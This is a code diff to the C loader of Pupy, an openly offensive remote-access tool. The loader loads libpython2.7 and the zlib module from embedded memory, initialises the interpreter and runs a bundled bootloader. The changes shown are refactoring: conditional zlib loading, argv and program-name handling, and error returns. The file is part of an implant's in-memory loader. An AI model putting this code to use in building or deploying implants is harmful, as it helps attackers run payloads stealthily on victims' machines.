@@ -3,6 +3,8 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
+#define _GNU_SOURCE
+#include <errno.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <limits.h>
@@ -19,8 +21,11 @@ extern const char resources_python27_so_start[];
 extern const int resources_python27_so_size;
 extern const char resources_bootloader_pyc_start[];
 extern const int resources_bootloader_pyc_size;
+
+#ifdef _PYZLIB_DYNLOAD
 extern const char resources_zlib_so_start[];
 extern const int resources_zlib_so_size;
+#endif
 
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
@@ -31,7 +36,6 @@ extern DL_EXPORT(void) initpupy(void);
 #else
 	const uint32_t dwPupyArch = 32;
 #endif
-
 
 uint32_t mainThread(int argc, char *argv[]) {
 
@@ -45,34 +49,41 @@ uint32_t mainThread(int argc, char *argv[]) {
 
 	if(!Py_IsInitialized) {
 		int res=0;
-		if(dlsym(NULL, "Py_GetVersion")){
-			dprint("libpython2.7.so is already loaded\n");
-			_load_python_FromFile("libpython2.7.so"); // does not actually load a new python, but uses the handle of the already loaded one
-		} else {
-			if(!_load_python("libpython2.7.so", resources_python27_so_start, resources_python27_so_size)) {
-				dprint("loading libpython2.7.so from memory failed\n");
-				abort();
-			}
-			dprint("python interpreter loaded\n");
+
+		if(!_load_python(
+				"libpython2.7.so",
+				resources_python27_so_start,
+				resources_python27_so_size)) {
+			dprint("loading libpython2.7.so from memory failed\n");
+			return -1;
 		}
 	}
+
 	dprint("calling PyEval_InitThreads() ...\n");
 	PyEval_InitThreads();
 	dprint("PyEval_InitThreads() called\n");
 
 	if(!Py_IsInitialized()) {
-		dprint("Py_IsInitialized!\n");
-
-		ppath = Py_GetPath();
-		dprint("PPATH: %s\n", ppath);
-		strcpy(ppath, "\x00");
+		dprint("Py_IsInitialized\n");
 
 		Py_IgnoreEnvironmentFlag = 1;
 		Py_NoSiteFlag = 1; /* remove site.py auto import */
-		Py_Initialize();
 
-		dprint("Py_Initialize()\n");
+		dprint("INVOCATION NAME: %s\n", program_invocation_name);
+		Py_SetProgramName(program_invocation_name);
+
+		dprint("Initializing python.. (%p)\n", Py_Initialize);
+		Py_InitializeEx(0);
+
+		dprint("SET ARGV\n");
+		if (argc > 0) {
+			PySys_SetArgvEx(argc, argv, 0);
+		}
+
+		PySys_SetPath(".");
 		PySys_SetObject("frozen", PyBool_FromLong(1));
+
+		dprint("Py_Initialize() complete\n");
 	}
 	restore_state=PyGILState_Ensure();
 
@@ -81,10 +92,12 @@ uint32_t mainThread(int argc, char *argv[]) {
 	initpupy();
 	dprint("initpupy()\n");
 
+#ifdef _PYZLIB_DYNLOAD
 	dprint("load zlib\n");
     if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size)) {
         dprint("ZLib load failed.\n");
     }
+#endif
 
 	/* We execute then in the context of '__main__' */
 	dprint("starting evaluating python code ...\n");
@@ -94,8 +107,6 @@ uint32_t mainThread(int argc, char *argv[]) {
 		resources_bootloader_pyc_start,
 		resources_bootloader_pyc_size
 	);
-
-	PySys_SetArgvEx(argc, argv, 0);
 
 	if (seq) {
 		Py_ssize_t i, max = PySequence_Length(seq);
